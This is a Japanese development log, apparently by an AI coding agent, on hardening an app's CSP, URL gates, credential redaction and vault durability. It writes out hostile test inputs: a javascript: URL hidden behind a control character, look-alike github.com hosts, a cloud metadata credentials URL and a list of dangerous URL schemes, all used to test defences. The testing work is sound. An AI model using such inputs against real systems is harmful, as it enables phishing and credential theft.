`fetch`/XHR 0・`<iframe>` 0・`<form>` 0) ので、姉妹と同じ
`default-src 'none'` を付けた。

#### 「注入前の姿」で決めて、注入後に 2 件出した

ここで**このセッションの教訓を自分で踏んだ**。
注入前の landing を測って `img-src data:` で足りると判断し、
実ブラウザでも違反 0 だった。ところが **`inject-pwa` 適用後**に測ると:

```
Refused to load the image '…/icon.svg' … "img-src data:"
Refused to create a worker from '…/sw.js' … "script-src 'unsafe-inline' …"
```

注入は manifest / apple-touch-icon / SW 登録スクリプトを足す。
**公開されるのは注入後の姿**なので、注入前を測ったのは代替物を測ったのと
同じだった。`worker-src 'self'` / `img-src 'self' data:` / `manifest-src 'self'`
を足し、注入後で違反 0 を確認。

もう一つ、**`inject-pwa` 自身の守りが先に鳴った** —— landing に
`script-src` の無い CSP を付けた瞬間「CSP に script-src が無く SW
スニペットを許可できません」で落ちた。**既存の門が私の回帰を止めた。**

#### 門は「注入後の実物」に当てる

`lint:csp` は `--app` / `--document` / `--none` のプロファイルで実物を見る。
`verify:all` には `--self-test` だけを入れ (成果物はビルド無しには無い)、
`ci.yml` が **inject-pwa 適用後**の 6 ファイルへ当てる ——
`verify:release-artifacts` と同じ形。

`app` は「script-src にハッシュが 1 つ以上」「`'unsafe-eval'` 不可」
「object-src / base-uri / form-action の固定」、
`document` は「`default-src 'none'`」「connect-src で通信を開けない」。
CSP の meta が 2 枚以上あれば落とす —— **1 枚目しか読めないまま緑を返さない**。

#### 自己検査を 2 度壊した (両方 eslint と self-test が捕まえた)

1. 最初の抽出は `content=["']([^"']*)["']` で、**CSP の値は単引用符だらけ**
   (`'self'` / `'none'` / `'sha256-…'`) なので**最初の `'` で切れて**いた。
   正しい CSP に 4 件の誤検知を出し、self-test が即座に落ちた。
   開き引用符を後方参照で綴じ、**抽出そのものを直に確かめる検査**も足した。
2. その抽出検査を **`let bad = 0` の前**に置いた。`bad += 1` は TDZ を踏むので、
   抽出が壊れたときに報告ではなく ReferenceError になる ——
   **失敗方向で壊れていた**。eslint の `no-useless-assignment` が捕まえた。

**同じ誤り (自己検査を宣言の前に置く) をこのセッションで 2 度やっている。**
対照や自己検査こそ、本体と同じ厳しさで見る。

---

### サイドバーだけが `SERVICE_IDS` に束ねられていなかった (2026-08-25)

CSP の作業中に landing の説明文が「**72 のサービス**」と書いているのに気付いた。
`verify:arch` の実測は **74** なので、腐った数値かと思って追った。

**違った。** landing の数は `services.length` の算出値で、しかも
自前の自己検査 (`parse mismatch` / `card count != services`) を持っている。
実測すると `SERVICE_IDS` 74 / サイドバー 72 で、差の 2 件はちょうど
`uber-eats` / `demae-can` —— BusinessPage が内部消費するだけで独立した
画面を持たないサービスである。**主張は正しかった。**

#### ところが、その 72 を守っている物が無かった

`SERVICE_CREDENTIAL_USE` も `SERVICE_DATA_ORIGIN` も、test が
**`SERVICE_IDS` との総当たり一致**を見ている。
`SERVICES` (サイドバー) だけが束ねられていなかった。

`SERVICES` は写像ではなく**配列**なので、1 行落としても型は通る。
落ちたことに気付ける物も無い —— 実測した:

| 検査 | なぜ気付けないか |
|---|---|
| `verify:arch` の service count | `SERVICE_IDS` を読む → 変わらない |
| `build:landing` の自己検査 | 「解析した数 == SERVICES の数」→ **両方減る** |
| `smoke` | `services.ts` から導出 → **両方減る** |
| `connectionStatus` の test | `SERVICES.length` を**両辺に置く** → 両方減る |

**どれも「自分自身と比べている」**ので、一緒に縮むと差が出ない。

#### 害は「画面へ行けない」だけではない

そのサービスの**保存済み資格情報を、画面から消せなくなる**。
`unusedStoredCredentials` が拾うのは「宣言上どの経路でも資格情報を
読まないサービス」だけで、サイドバー不在は見ていない。接続状況ハブも
`SERVICES` を回すので、そこにも出ない。
**金庫の中に、開ける扉の無い引き出しが残る。**

#### 直した — 双方向の台帳つき test 9 件

`src/renderer/__tests__/sidebarCoverage.test.ts`。
例外は理由つきの台帳 (`SIDEBAR_LESS`) に固定し、**双方向**にした ——
台帳にあるのにサイドバーへ出ていれば、それも落とす。
空撃ち検査 (両方 50 件超) と、`74 = 72 + 台帳 2` の内訳検査も置く。

対照 2 本:

```
linear をサイドバーから削る
  × 台帳に無いサービスは、すべてサイドバーに出る
    → expected [ 'linear' ] to deeply equal []
  × 数の内訳が実測と合う → expected 73 to be 74

台帳へ github (実際は出ている) を足す
  × 台帳の項目は本当にサイドバーに出ていない
    → expected [ 'github' ] to deeply equal []
```

**教訓**: 「一覧が縮んでいないか」を、その一覧自身の長さで確かめてはいけない。
比較先は**別の出所** (ここでは `SERVICE_IDS`) でなければ意味を持たない。
このリポジトリは同じ形を 2 つの台帳で既に実装しており、
**画面の一覧だけが漏れていた**。

#### 残りの一覧も同じ軸で掃いた — 束ねられていたのは 3 / 4

前項の形 (**その一覧自身と比べているので、一緒に縮むと差が出ない**) を
サービス id で引く残りの表すべてに当てた。

| 表 | 何で束ねているか | 判定 |
|---|---|---|
| `LIVE_FETCHERS` | `Record<ServiceId, …>` **かつ**読み込み時に `SERVICE_IDS` を回して throw | **二重に束ねられている** ✅ |
| `LOCAL_SERVICES` | `ReadonlySet<ServiceId>` —— 部分集合が仕様 | 対象外 ✅ |
| `LIVE_ACTIONS` | `Partial<Record<…>>` —— 部分が仕様。`lint:test-coverage` が action 名を束ねる | ✅ |
| **`SNAPSHOT`** | **型注釈が無い素のオブジェクトリテラル** | **束ねられていない** ❌ |

`SNAPSHOT` は `Record<ServiceId, …>` ではないので、項目を落としても型は通る。
多くのサービスの fetcher は「`SNAPSHOT[id]` をそのまま返す」静的スタブなので、
落ちた項目のページは**常に空**になる。`lint:test-coverage` は test と action を
`SERVICE_IDS` へ束ねているが、スナップショットは見ていない。

#### 照合の鍵を一度読み違えた

素の id で比べると **12 件が「無い」**と出た。誤りである ——
scaffold は id を camelCase にして鍵にする (`microsoft-365` → `microsoft365`)。
一方でページ側は `SNAPSHOT['ai-blogkun']` のように**素の id で引く**箇所もある。
**両方の綴りを受ける**照合に直したら、実際に無いのは **`village` 1 件**だけで、
これは専用 fetcher (`fetchVillageSnapshot`) を持ち `VillagePage` が
`SNAPSHOT` を読まないので**正しく不在**だった。

**「12 件も落ちている」と早合点しかけた。** 照合の鍵を実物で確かめてから
結論を出す —— 今日 3 度目の同じ教訓である。

#### 直した — 台帳つき検査 6 件 (計 15 件)

`village` は理由つき台帳へ。`fetchedAt` (スナップショット全体の取得時刻) も
「サービスでない鍵」の台帳へ。どちらも**双方向**。
**camelCase 変換が実際に効いていること自体**も検査する
(効かなくなれば照合が破綻するので、それを固定する)。

対照: `super-delivery` のスナップショットを削ると名指しで落ちる。

---

### 第三者の応答をどう扱っているか — 更新確認は白 (2026-08-25)

軸を「**アプリが第三者から受け取った値をどう扱うか**」へ移した。
最初の的は更新確認 (`shared/updateCheck.ts`) —— GitHub の応答から
`tag_name` と `html_url` を取り、後者を「更新はこちら」として画面に出す。
**応答を差し替えられたら任意の URL を押させられる**位置である。

#### 判定は正しかった

`isGithubReleaseUrl` は `new URL()` で解析し、`protocol === 'https:'` かつ
**`hostname` を完全一致**で `github.com` / `www.github.com` と比べる。
古典的な回避を実測で当てた:

| 入力 | 正規化後の hostname | 結果 |
|---|---|---|
| `https://github.com.evil.test/x` | `github.com.evil.test` | 弾く ✅ |
| `https://evil.test/github.com` | `evil.test` | 弾く ✅ |
| `https://github.com@evil.test/x` | `evil.test` | 弾く ✅ |
| `https://g<U+0456>thub.com/x` (キリル文字の i) | `xn--gthub-n2e.com` | 弾く ✅ |
| `https://github.cοm/x` (ギリシャ ο) | `github.xn--cm-jbc` | 弾く ✅ |
| `https://sub.github.com/x` | `sub.github.com` | 弾く ✅ |

#### 自分の期待のほうが間違っていた (今日 3 度目)

1 件だけ「通った」—— `https://ｇithub.com/x` (**全角の ｇ** U+FF47)。
同型異字の見逃しかと思ったが、実測すると:

```
new URL('https://ｇithub.com/x').hostname === 'github.com'
```

URL の解析が NFKC で ASCII の `g` へ畳むので、これは**本物の github.com**
である。開かれるのも本物なので、**通すのが正しい**。
規則が正しく、私の期待が誤っていた。

(同じ形は今日 3 度目 —— `data:image/pngX` の綴り、landing の「72」、そしてこれ。
**「鳴らなかった」と同じくらい「鳴った」も疑う。**)

#### 足したのは検査だけ

既存の検査は別ホスト・平文・非 URL を覆っていたが、
**同型異字と userinfo が無かった**ので 5 件足した。

さらに **通す側の標本を 1 件**足した —— 全角 ｇ の行である。
一見すると余計だが、これは**弾く側の設計を守っている**:

> 判定を「生の文字列に `github.com` が含まれるか」へ書き換えると、
> **弾く側の標本のうち 2 件は落ちるが**、この行は「通す」のままなので
> 気付きにくい。逆に**この行を残しておくと、書き換えは 3 件を落とす**。

対照で確かめた —— `raw.includes('github.com')` に書き換えると:

```
× 別ホスト・平文・非 URL は断る        (github.com.evil.example が通る)
× 見た目が github.com でも、別ホストなら断る (userinfo が通る)
× 正規化すると本物になる綴りは通す      (本物が弾かれる)
```

**両方向が同時に鳴る。** 安全側の主張と、正当な利用の主張を対にして置くと、
片方だけを満たす改変が通らなくなる。

#### 関門が在る理由が、その関門の検査に無かった

更新確認の次に、**OS のブラウザへ URL を渡す唯一の関門**
(`shared/externalUrlGate.ts`) を同じやり方で突いた。
危険なスキームは全部弾いた —— `javascript:` (大小混在も) / `data:` /
`file:` / `vscode:` / `ms-msdt:` / `smb:` / `jar:`、非文字列、
`toString` を持つ偽装オブジェクト。

**2 件「通った」が、どちらも私の期待の誤りだった** (今日 4 度目)。
パスに NUL を挟んだ `https://example.com/<NUL>x` は通るが、返るのは
`https://example.com/%00x` —— **解析して正規化した href** なので、
生の NUL は OS へ届かない。`%2e%2e/` も `/` へ畳まれる。
長大なホスト名も、危険ではない。

#### ところが、標本の側に穴があった

このファイルの注記は、main とブラウザ版の判定が割れた入力を **6 つ**挙げ、
「**前 2 つが効く構図である**」と書いている:

```
"https://<LF>javascript:alert(1)"   main=false  browser=true
"http://<NUL>evil"                  main=false  browser=true
```

どちらも**字面は `https://` で始まる**ので、旧ブラウザ版の
`/^https?:\/\//i` は通してしまう。だが解析すると別物になる。

**その 6 つのうち 1 つも標本になっていなかった。** 表にあったのは
スキームの大小・既定ポート・前後の空白といった**見た目の正規化だけ**で、
**割れの原因だった制御文字が 1 件も無い**。

つまり「この関門が在る理由」を、この関門の検査は 1 つも押さえていなかった。
`web-shim.ts` が字面検査へ戻っても、落ちるのは静的な文字列検査だけで、
**振る舞いの検査は全部緑**になる。

#### 直した — 6 件 + 性質 1 件

注記の 6 入力をそのまま標本にし、加えて**性質**を 1 つ置いた:

> **通した URL に生の制御文字は残らない。**

個別の標本ではなく性質にしたのは、OS へ渡す文字列に NUL が残ると
C の API で切り詰められ、「調べた URL」と「開く URL」が変わりうるため。
空撃ち検査つき (1 つも通らなければ、この検査は何も言っていない)。

対照 —— 関門を旧ブラウザ版の字面検査へ戻すと **8 件**が落ちる。
うち 2 件は**まさに注記が「効く構図」と呼んでいた 2 つ**である。

#### 手順の誤りを 1 つ記録する

この節を書くとき、記録の中に**制御文字そのもの**を書こうとして
ツールの入力検証に 2 度弾かれた。前のコミットでも同じ形で
`lint:charset` を鳴らしている (キリル文字)。
**危険な入力を説明する文章は、その入力を実物で書かない。**
`<NUL>` / `<LF>` のような表記に置き換える。

#### 訂正 — 「CSP は誰も見ていなかった」は言い過ぎだった (2026-08-25)

`lint:csp` を足したときの記述を訂正する。**既に見ている検査があった。**

`src/shared/__tests__/shippedCsp.test.ts` (コミット `d69eb047`
「同梱される CSP は、緩めても誰も気付かなかった」) は、
`src/renderer/index.html` と `scripts/inline-html.cjs` の `buildCsp()` を
直に読み、ディレクティブ単位で留めている:

- `script-src` はデスクトップが `'self'`、ブラウザがハッシュ列。
  **どちらも `'unsafe-inline'` を含まないこと**を明示的に検査している
- `connect-src` / `worker-src` の意図的な差
- `object-src` / `frame-src` / `base-uri` / `form-action` / `default-src` は
  2 つのビルドで同じであること
- ディレクティブの数が増減していないこと
- `parsePolicy` 自身の空撃ち検査

**つまり私が「ここでしか捕まらない」と書いた回帰
(`script-src` が `'unsafe-inline'` へ戻る) は、
`inline-html.cjs` を書き換える形なら、この検査が捕まえる。**

#### では `lint:csp` は何を足しているのか (訂正後の正しい理由)

1. **`inject-pwa` 適用後の実物**を見る。`shippedCsp.test.ts` が読むのは
   **雛形** (`index.html` と `buildCsp()`) であって、公開されるファイルではない。
   この差は実測で効いた —— landing は注入**前**は違反 0、注入**後**に
   `img-src` と `worker-src` で 2 件出た。雛形を読む検査はこれを見られない。
2. **landing と デモ 3 本**。`shippedCsp.test.ts` の対象外で、実際
   **CSP を 1 つも持っていなかった**。この発見は訂正の影響を受けない。
3. 雛形と出力がずれるビルド不具合。

#### 手順の教訓

**門を作る前に、既に覆っている物を探す。** `MUST_MEASURE` の棚卸しで
たまたま `shippedCsp.test.ts` の存在に気付いたのであって、
`lint:csp` を作る前には探していなかった。
「誰も見ていない」と書く前に、`grep -rl` を 1 回打てばよかった。

門そのものは残す —— 上の 3 点は実際に足されている価値である。
訂正するのは**主張の強さ**であって、門の要否ではない。

#### 実装だけ移して、検査を置き去りにしていた (2026-08-25)

2026-08-24 に `safeImageSrc` / `safeCssUrl` を `components/DataList.tsx` から
`src/shared/imageUrlGate.ts` へ出した。理由は「**関門がコンポーネントの中に
隠れていたから変異検査に載らなかった**」である。

**ところが検査は `DataList.render.test.ts` に残したままだった。**
`MUST_MEASURE` 33 件の棚卸しで、名前の対応する検査ファイルが無い唯一の
「壁」として浮いた。実装だけを移すと:

- 探す人は `shared/__tests__/imageUrlGate.test.ts` を見て「無い」と判断する
- コンポーネントの描画テストを整理する変更に、関門の検査が巻き込まれうる

関門を分けた理由が「置き場所」だったのに、**検査の置き場所は直していなかった。**

3 節 22 件 (`safeImageSrc — 許可スキーム` / `safeCssUrl — CSS url() へ入れる形` /
`imageUrlGate — 変異検査で見つかった穴`) を `src/shared/__tests__/imageUrlGate.test.ts`
へ移した。描画を通す検査 (`DataList — thumbnailUrl のスキーム検証` ほか) は
コンポーネントの話なので `DataList.render.test.ts` に残す。

**移動が中立であることを数えて確かめた** —— 移動前のファイルを別名で
復元して走らせると **37 件**、移動後は 15 + 22 = **37 件**。
(このとき合計が「10,650 のはず」と書きかけたが、私の基準値の記憶違いで、
10,647 + updateCheck 2 + externalUrlGate 7 = **10,656** が正しい。
数を主張する前に、その数の出所を辿る。)

#### 「壁には同名の検査ファイルを」という門は作らなかった

同じ事故を機械で止められないかを測った。`MUST_MEASURE` 33 件のうち
**7 件**が「同じ `__tests__` に同名の検査ファイルを持たない」と出たが、
中身を見ると**ほとんどが私の走査の厳しすぎ**だった:

| 壁 | 実際 |
|---|---|
| `network/proxy.ts` | `proxy.test.ts` は在る (別ディレクトリ) |
| `oauth/pkce.ts` | `pkce.test.ts` + `pkce.contract.test.ts` が在る |
| `shared/atlassianSite.ts` | `atlassianSiteParity.test.ts` |
| `shared/redact.ts` | 3 つの検査が別角度から覆う |
| `main/secrets.ts` / `main/main.ts` / `preload/preload.ts` | 変異検査の対象 (244 件) に入っており、`mainIpc.test.ts` ほかが覆う |

**本物の欠落は 0 件。** ここで門を作れば、**私の走査の欠陥のほうを
規則に固めることになる**ので作らない。台帳を 7 件書く手間より、
「事実として穴が無い」ほうが重い。

---

### 実挙動を端から端まで回した — 全部緑 (2026-08-25)

メタ層 (門・網羅・台帳) の探索が細ってきたので、**実際に動くかどうか**へ戻った。
今日は 14 コミットでビルド script・CSP・門の骨組みに触れている。
**CI が既定で回さない 5 つ**を、現在の HEAD で全部回した。

| 道具 | 何を実際に動かすか | 結果 |
|---|---|---|
| `e2e` | 実 chromium・実 IndexedDB。11 節 (決算/枠拒否/無通信/保管庫のパスワード変更ほか) | ✅ 全件 |
| `e2e:lite` | 同じ節を LITE 版 (2.74MB) で | ✅ 全件 |
| `perf` | 起動性能 + `JSON.parse` 計装の自己証明 | ✅ LITE 137ms / FULL 410ms |
| `smoke` | Electron で **72 面**を撮影 + console エラー収集 | ✅ 72 面・エラー **0 件** |
| `e2e:ollama` | スタブ Ollama + 実 chromium。7 状態 | ✅ 全件 |

**この 5 つはどれも CI の既定では走らない**ので、ビルド script と CSP を
触った日に回す価値がある。**結果は全部緑** —— 今日の変更で壊した物は無い。

### Service Worker のキャッシュを、読まずに測った

CSP の作業で「SW は保管庫と同じオリジンで走る」ことを再確認したので、
**何がキャッシュに入るのか**を実際に見た。注記は「同一オリジンの GET のみ」と
書いているが、書いてあることと起きることは別である。

注入済みの `app.html` を配って実ブラウザで開き、SW が active になった後で
Cache Storage を列挙した:

```
Service Worker: active
Cache Storage:
  [service-hub-v2] 4 件
     /app.html  /index.html  /manifest.webmanifest  /icon.svg
ページが出した要求 (同一オリジン外): 0 件
```

**アプリシェルの 4 件だけ。** 第三者 API の応答も、資格情報を含む物も入らない。
注記どおりだった (2026-07 の監査以前は全 GET を書いていて、
GitHub / HIBP の応答が平文で無期限に残っていた)。

### WebAuthn は「作りとして」使えないようにしてある

`security/webauthn.ts` を読んだ。旧実装は `rawId.byteLength > 0` だけで
`true` を返していた —— 署名も challenge も origin も見ない、実質の素通しである。

今は **fail-closed** に畳んである:

- `verifyBiometric` は**必ず throw する** (`BiometricVerificationUnimplementedError`)
- **認証器セレモニー自体を実行しない** —— 生体プロンプトを出しておいて
  検証しないのは「利用者に誤った保証を与える」ので、UI を出す前に落とす
- `registerBiometric` は credentialId しか返さず、「これだけでは何の権限も
  生まれない」と注記にある
- **解錠ゲートへ配線している呼び出し側は 0 件** (唯一の言及は
  `lockWorkspace.ts` の注記で、同じ畳み方を参照しているだけ)

未実装を throw で可視化し、UI も出さない —— **「まだ無い」を安全側で表現する
形として、そのまま手本になる。**

### この回で見つけた欠陥: 0 件

探索の収穫は細っている。攻撃面 (資格情報・URL・供給網・出荷物・SW・生体認証)
は繰り返し当たっても白が続く。**残っているのは、私が単独では動かせない
持ち主判断のほう**である (docs/REMAINING_WORK.md 冒頭の一覧)。

---

### 冒頭が挙げた 4 つの危険のうち、実装は 3 つしか見ていなかった (2026-08-25)

残りの shared 関門を実測で突いた。`atlassianSite` は白 ——
部分ドメイン / パスに紛れ込ませる形 / userinfo / 平文 http / 制御文字を
すべて弾き、大文字は正規化して通す。

`scanTarget.ts` (VirusTotal へ送る URL) で 1 件出た。

#### 脅威モデルは SSRF ではない —— 「公開」である

最初は `https://169.254.169.254/…` が通るのを SSRF かと思ったが、違った。
**この URL を取りに行くのはこちらではなく VirusTotal である。**
このファイルの冒頭がそれを正確に書いている:

> VirusTotal に URL を投入するのは「調べる」ではなく「公開する」に近い。
> 投入された URL は VT の有料利用者が検索できる。つまり、貼り付けた URL に
> 署名付きリンク・招待リンク・セッション識別子・**社内ホスト名**が入っていれば、
> それはこちらの手を離れて第三者の目に触れる。取り消せない。

#### 実装が見ていたのは前 3 つだけだった

`describeScanUrlRisk` が拾うのは (a) userinfo、(b) 資格情報らしき名前の
クエリ、(c) 同じくフラグメント (OAuth の暗黙フロー) の 3 つ。
**4 つ目の「社内ホスト名」だけが無かった。** 実測で 9 形すべて無警告:

```
警告なし  https://jenkins.internal/job/deploy-prod
警告なし  https://10.0.0.7/wiki/salaries
警告なし  https://169.254.169.254/latest/meta-data/iam/security-credentials/
```

`jenkins.internal/job/deploy-prod` を送れば、**その CI の存在とジョブ名**が
VT の有料利用者に検索可能な形で残る。メタデータの URL なら、
**クラウドの資格情報の口を触っていること自体**が残る。取り消せない。

#### ループバック判定を借りなかった理由

`shared/__tests__/loopbackChecks.test.ts` は「ループバック判定は 3 つあり、
**問いが違うので答えも違う**」「統合は狭い側を広い側へ寄せる方向にしか
働かず、security の許可を広げる」と留めている。

ここはさらに別の問い ——「**送ると社内の情報が出るか**」であって、
「平文 http を許すか」でも「待受の Host を受けるか」でもない。
だから private 範囲も予約 TLD も単一ラベルも含む、いちばん広い網になる。

**広く取ってよいのはここだけである** —— これは**警告**であって関門ではない
(冒頭の「止めない」方針)。外したときの害は「余計な警告」で、許可の拡大ではない。

実測の精度は **26/26** —— 範囲のすぐ外 (172.15 / 172.32 / 11.0 / 100.63 /
100.128 / 169.1 / 192.169) は全部無警告。

#### 変異検査の「生存」を信じなかった (repo の作法どおり)

対象を絞って `--mutate` を掛けると `scanTarget.ts` は **79.17%・生存 20** と
出た。**変更前の HEAD でも同じ**だったので、私の追加のせいではない。

そこでこのリポジトリ自身の作法 ——「生存はそのままでは信用しない」——
に従って手で当てた。報告された生存の 1 つ (`SECRET_PARAM_NAMES` の
`'token'`) を実際に潰すと、**5 件の検査が落ちた**。

**偽の生存だった。** 対象を絞った `--mutate` は perTest の帰属がずれる。
`imageUrlGate` などで **生存 0** と出たほうは影響を受けない
(偽の生存は数を増やす側にしか出ないので、0 なら 0 である)。

**代わりに手で当てて確かめた** —— 新しいコードの変異 9 種のうち
最初の 1 つが本当に生きていた:

```
❌ 生存  169.254/16 → 169/8 に広げる
```

`169.254` **だけ**がリンクローカルで、`169.1.2.3` は公開アドレスである。
その負の標本が無かった。境界を 5 件足して、範囲を持つ 3 つ
(169.254 / 192.168 / CGNAT) すべてで「広げると鳴る」ことを確認した。

**教訓**: 道具が「生存 20」と言っても、そのうち本物は 1 件だった。
**数を読む前に、1 つ手で当てる。**

#### 残りの壁 4 枚 — 全部白、ただし測り方が違った (2026-08-25)

`scanTarget` で 1 件出たので、同じ軸を残りへ当てた。**4 枚とも白**だが、
白と分かるまでの筋道が違うので書き残す。

**`redact.ts` — 「漏れ 15 件」に見えたが、設計上の限界そのものだった**

送っている資格情報 17 種を 5 つの形 (素のまま / JSON のヘッダ / 線上のヘッダ /
URL のクエリ / 本文中) で通したら **15 件が伏せられなかった**。
OpenAI `sk-…` / Shopify `shpat_…` / Stripe `sk_live_…` / Discord / JWT が
**ヘッダ名の手がかりが無い形**で残る。

だが欠陥ではなかった。この網は**ヘッダ名から探す**設計で、
`redactionCoverage.test.ts` に

> **名前の手がかりが無い自由文の中までは伏せない (設計上の限界を明示)**

という検査が既に置いてある。そして `scan-credential-headers.cjs` が
**送っている側から数えて 6 種 / 54 箇所** —— `authorization` / `hibp-api-key` /
`x-api-key` / `x-apikey` / `x-goog-api-key` / `x-proxy-auth` —— を出し、
**6 種とも網に入っている**。私が「漏れた」と言った 5 つは、
このアプリがヘッダで送っていない資格情報である。

**ただし 1 つだけ、ヘッダではない経路がある。** census が数えるのはヘッダ名
だけなので、**URL のクエリに載る資格情報**は別に確かめた:

```
src/main/clients/youtube.ts:76   `…&key=${key}`
```

**1 箇所だけ**で、しかも `redact.ts:119` がその理由を名指しで書いている
(「YouTube で `?key=…` の形の URL に載せて送るので…ここでも拾う」)。
Google の API キーは `AIza` 接頭辞を持つので、実測で URL の中でも
エラー本文の中でも伏せられた。**白。**

**`vaultToken.ts` — 注記の決定表と実物が 9 行とも一致**

いちばん効くのは `{refreshToken: …}` (accessToken 無し) が **`null`** を返すこと。
注記が「アクセストークンより強い refresh token が、それを渡す必要のない相手へ
出る」と書いている当の欠陥は、実測で閉じている。配列・数値・`null` リテラルも
すべて `null`。

**`tokenInput.ts` — 空 / 空白だけ / 65536 字超 / 改行 / NUL / タブ / 非文字列を全部弾く**

境界も正しい (65536 は通し、65537 で弾く)。前後の空白は落として通す。

**`atlassianSite.ts` — 部分ドメイン / パス紛れ / userinfo / 平文 http / 制御文字を全部弾く**

大文字は正規化して通す。

#### 「鳴った」を疑うほうが、今日は当たっている

`bearerFromStoredToken('')` が `null` ではなく `''` を返すのを 1 件目の
「ずれ」として挙げかけたが、注記の決定表を読み直すと
**「JSON として読めない → その文字列」**であって、`''` は JSON ではない。
表どおりである。しかも入口の `checkTokenInput` が空を弾くので到達しない。

**今日これで 6 度目**である —— `data:image/pngX` / landing の「72」/
全角 `ｇ` の `github.com` / NUL の正規化 / `MUST_MEASURE` の「7 件欠落」/
そしてこれ。**「鳴らなかった」と同じ重さで「鳴った」を疑う。**

---

### Electron の「設定していない既定」を数えた — 綴り検査 (2026-08-25)

`MUST_MEASURE` の壁 33 枚を当て終えたので、**壁の外**へ出た。
IPC の入口は `mainIpc.test.ts` が 813 行 64 件で全 13 ハンドラを敵性入力込みで
覆っており (知らない id / 非文字列 / プロトタイプ由来の action 名 /
payload が素のオブジェクトでない / 失敗が reject しない / 伏字 / 長さ切り)、
`payload` を展開して合成する箇所も無い (プロトタイプ汚染の面はゼロ)。
**重ねる価値が無い**ので軸を変えた。

**禁じている物ではなく、設定していない物を見る。**
`webPreferences` は `contextIsolation` / `nodeIntegration` / `sandbox` の
3 つを固定しているが、**Electron が既定で有効にする物**は別にある。

#### `spellcheck` は既定で `true` だった

実測: `isSpellCheckerEnabled(): true` / 言語 `["en-US"]` / 利用可能 57 言語。

Electron の綴り検査は hunspell の辞書を **Google がホストする CDN** から
取りに行く設計である。このアプリはブラウザ版に
「**開いただけで外へ出ていかない**」を e2e (`noBeacon` 節) で留めているが、
**デスクトップ版に同じ主張は無かった。**

#### 「起きる」ことは実測できなかった —— 正直に書く

`<textarea spellcheck="true">` を差し込み、**実キーイベント**で綴り誤りを
56 文字打ち込んで 6 秒待った。`session.webRequest.onBeforeRequest` から
見える取得は **0 件**。`file:` 以外の要求そのものが 0 だった。

ただし Chromium の部品更新系の取得は `webRequest` を通らないことがあるので、
**「起きない」ことを測り切れてはいない。**

#### それでも切った理由

日本語の入力は hunspell の対象外で、英字で打つのは URL と資格情報ばかり ——
**綴り検査が付いても波線が出るだけで役に立たない**。
得るものが無く、閉じ切れない経路が 1 本残る。だから切る。
**これは「直した欠陥」ではなく「畳んだ面」である。**

#### 途中で「効いていない」と読み違えかけた

`webPreferences.spellcheck: false` を入れて実測すると、
`isSpellCheckerEnabled()` は **`true` のまま**だった。

```
既定 (未設定)      → isSpellCheckerEnabled: true
spellcheck: false → isSpellCheckerEnabled: true   ← 効いていない?
```

**違った。** `isSpellCheckerEnabled()` は **session** の性質で、
`webPreferences.spellcheck` は **webContents ごと**の設定である。
**見ていた物が、設定した物と違っていた** —— 今日何度も書いた
「検査が実物ではなく代替物を見ている」を、自分の測り方でやった。

`session.setSpellCheckerEnabled(false)` を足すと `true → false` と
**観測できる**ようになる。両方切ってあるのは、

- `webPreferences` は窓ごとに効く (新しい窓を足したときの既定)
- `session` 側は**外から確かめられる** (検査に書ける)

の 2 つが揃わないと「切れている」と言えないからである。

対照 2 本 —— どちらを外しても `mainWindow.test.ts` が落ちる。
`verify:arch` も、行がずれた `ALLOWED_PERMISSIONS` の参照 (71 → 90) を
その場で指摘した。

---

### 暗号化はしていたが、消えないとは誰も言っていなかった (2026-08-25)

Electron の権限まわりを実測していて、`persistent-storage` が拒否されているのを
見た。これは正しい (要求は既定で断る) が、**そこから別の問いが出た** ——
**この保管庫は消えないのか。**

#### 実測 — ブラウザ版の保管庫は「消えうる」領域に在る

`dist/standalone.html` を実ブラウザで開いて問い合わせた:

```
navigator.storage.persisted()  → false
navigator.storage.persist()    → false   (要求そのものが断られた)
割当                            → 937 MB / 使用 5 KB
```

保管庫 (`IndexedDB business-hub-vault`) は **best-effort** の領域にある。
この状態では**空き容量の都合や長期の無操作でブラウザが立ち退かせうる**。
Safari の ITP は**無操作 7 日**で消す。

#### いちばん効くのは「24 語では戻せない」こと

このアプリは設定時に 24 語のリカバリーフレーズを見せ、画面にも
「パスワードを忘れても復元できます」と書いてある。**それは正しい** ——
ただし**保管庫が在るとき**の話である。

立ち退きでは**暗号化されたトークンごと消える**ので、フレーズが開ける対象が
残らない。**戻せるのは書き出したバックアップだけ**である。
利用者はフレーズを控えていれば安全だと読むので、ここは伝えないと危ない。

#### `persist()` は当てにしない

Chromium は「導入済み / 関与が高い」ときだけ persist を認めるので、
呼んでも断られる (実測がまさにそれ)。それでも呼ぶのは**認められる利用者には
効く**からで、費用は 0。**断られたことを画面へ伝えるほうが本体**である。

#### 直した

- `StorageProtection` に **`durability: 'file' | 'persistent' | 'best-effort'`** を追加
  (デスクトップは `'file'` 固定 —— userData のファイルに立ち退きは無い)
- ブラウザ版は **毎回問い合わせる** (`persist()` を試してから `persisted()` の
  実際の値で名乗る。要求の成否ではなく**状態**を返す)
- 設定画面に「⚠️ この保管庫は『消えうる』領域にあります」+ **24 語では戻せない**
  + バックアップの勧め + インストールで格上げされうること
- **暗号化の状態とは独立に出す** —— 暗号化されていても消えるときは消える

#### 判断は画面から出した

`state.durability === 'best-effort'` を `SettingsPage.tsx` に書くと、
`mutate` に `.tsx` が 1 件も無い構成では**一度も測られない**
(2026-08-24 に `safeImageSrc` で同じ足元を掬われている)。
`shared/storageDurability.ts` へ出し、検査 5 件 + 対照 (判定を反転すると 3 件落ちる)。

**`undefined` では出さない**ことも留めた —— 古いブリッジや取得前に警告を出すと
「確かめずに脅す」ことになり、本当に消えうるときの警告まで軽く見られる。

#### 既存の検査が私の変更を捕まえた

`secretsProtection.test.ts` は `storageProtection` の**鍵の一覧を字面で固定**
している ——「秘密を載せる欄が黙って増えないため。増やすときは『その欄に
秘密が載りうるか』を人が見ることになる」。
`durability` を足した瞬間にここが落ちた。**設計どおりに人を止めた**ので、
3 値の列挙で店の中身を通らないことを注記して期待値を更新した。

#### 途中で 2 度、確かめずに読みかけた

1. ヘルパ関数をオブジェクトリテラルの**中**へ挿し込んで型検査が壊れた
2. ブラウザでの確認で「警告が出ない」と 3 回読んだが、実際には
   **保管庫が作られていなかった** (設定画面はパスワード欄が 2 つあり、
   1 つしか埋めていなかったので「パスワードが一致しません」で止まっていた)。
   本文を丸ごと出して初めて分かった —— **「出ない」を読む前に、そこへ
   到達しているかを出力で確かめる。**

#### 実機で確かめた —— 対照を節の中に入れた (12 節目)

`e2e` に `storageDurability` 節 (12 項目)。実 Chromium・実 IndexedDB で
保管庫を作り、`storageProtection()` の `durability` と設定画面の表示を見る。

